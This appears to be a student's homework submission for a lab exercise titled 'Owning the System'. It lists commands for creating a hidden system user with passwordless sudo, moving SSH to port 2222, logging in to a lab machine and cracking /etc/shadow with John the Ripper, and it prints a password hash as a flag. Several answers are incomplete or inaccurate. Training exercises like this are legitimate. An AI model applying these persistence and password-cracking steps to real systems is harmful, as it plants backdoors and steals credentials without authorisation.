Ernest Pobee - Unit 6 Homework
Week 6 Homework Submission File: Advanced Bash - Owning the System

Step 1: Shadow People
Create a secret user named sysd. Make sure this user doesn't have a home folder created:
adduser sysd

2. Give your secret user a password:
Your solution command here: secret1

3. Give your secret user a system UID < 1000:
 
Your solution command here: usermod -u 900 -g 900 sysd or 
etc> id sysd
etc> groupmod -g 900 sysd

4. Give your secret user the same GID: 
Your solution command here: usermod -u 900 -g 900 sysd
etc> id sysd

5. Give your secret user full sudo access without the need for a password:
Your solution command here: sysd ALL=(ALL) NOPASSWD:ALL

sudo visudo

6. Test that sudo access works without your password:
 Your bash commands here: su sysd

     	
Step 2: Smooth Sailing
Edit the sshd_config file:
 Your bash commands here

# under Port 22
Port 2222


Step 3: Testing Your Configuration Update
Restart the SSH service:
Your solution command here
systemctl restart ssh

2. Exit the root account:
Your solution command here
exit

3. SSH to the target machine using your sysd account and port 2222:
Your solution command here:
ssh sysd@192.168.6.105

4. Use sudo to switch to the root user:
Your solution command here:
sudo su

 
You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0
Step 4: Crack All the Passwords
SSH back to the system using your sysd account and port 2222:
Your solution command here
Already SSH-ed into target machine

2. Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:
Your solution command here
root@scavenger-hunt: /home/sysd# john /etc/shadow
